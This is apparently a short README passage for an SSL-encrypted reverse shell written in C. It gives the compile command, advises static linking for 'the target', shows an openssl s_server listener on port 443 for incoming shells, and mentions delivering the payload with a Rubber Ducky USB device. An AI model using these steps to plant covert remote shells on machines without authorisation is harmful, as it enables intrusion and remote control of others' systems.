
## Compilation and Use
  <pre>
  Before compiling , please make sure you have the OpenSSL dev package installed .</br>
Compile using : </br>
       <b> gcc -Wall -g -o shell shell.c -lssl -lcrypto </b></br>

   You will probably want to link statically against the library to avoid dependencies issues on the target. 

   You can either use [ncat](http://edoceo.com/cli/ncat) or any other tool with ssl support to send commands to the client .</br>
   To test the client, you can use openssl s_server utility on your server and wait for connections: </br>
       <b>openssl s_server -key key.pem -cert cert.pem -accept 443</b>
</pre>


## Rubber Ducky Script
  This is a script that can be used to deliver your payload using HAK5 [Rubber Ducky USB stick](https://ducktoolkit.com).
